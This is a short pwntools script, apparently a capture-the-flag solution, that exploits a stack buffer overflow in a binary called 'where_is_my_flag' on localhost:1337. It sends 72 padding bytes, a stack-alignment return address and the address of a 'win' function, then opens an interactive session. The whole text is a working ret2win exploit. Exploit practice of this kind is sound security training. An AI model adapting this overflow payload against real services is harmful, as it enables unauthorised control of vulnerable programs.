from pwn import *
context.terminal = ['tmux', 'new-window']

binary = './where_is_my_flag'

#p = process(binary)
#p = gdb.debug(binary, gdbscript="""""")
p = remote("localhost", 1337)

payload = (72) * b'A'
payload += p64(0x0000000000401205) # align stack (call return of main)
payload += p64(0x401176) # win function call

p.sendline(payload)

p.interactive()
p.close()

